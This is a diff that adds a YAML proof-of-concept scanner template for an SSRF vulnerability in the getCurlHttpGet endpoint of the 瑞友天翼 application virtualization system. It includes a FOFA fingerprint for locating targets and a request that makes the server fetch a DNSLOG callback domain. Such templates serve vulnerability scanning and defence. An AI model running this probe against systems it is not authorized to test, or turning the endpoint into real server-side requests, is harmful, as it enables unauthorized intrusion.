@@ -1,0 +1,17 @@
+id: poc-yaml-gwt-system-getcurlhttpget-ssrf
+info:
+  name: 瑞友天翼应用虚拟化系统 getCurlHttpGet SSRF漏洞
+  severity: medium
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 瑞友天翼应用虚拟化系统
+  fofa: body="瑞友天翼 - 应用虚拟化系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /hmrao.php?s=/Admin/getCurlHttpGet&URL=https://{{.domain}}
+  expression: status_code == 200 && body == "" && reverse.Verify()
+transport: http
